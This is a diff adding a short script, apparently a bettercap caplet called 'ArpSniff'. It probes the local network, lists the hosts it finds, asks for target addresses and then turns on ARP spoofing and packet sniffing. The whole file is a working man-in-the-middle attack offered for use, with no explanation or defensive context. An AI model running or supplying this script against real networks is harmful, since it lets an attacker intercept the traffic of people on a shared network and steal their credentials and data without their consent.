@@ -1,0 +1,10 @@
+# ArpSniff
+# By SuXY
+
+net.probe on
+sleep 5
+net.show
+net.probe off
+read arp.spoof.targets Enter ArpSniffTargets > 
+arp.spoof on
+net.sniff on
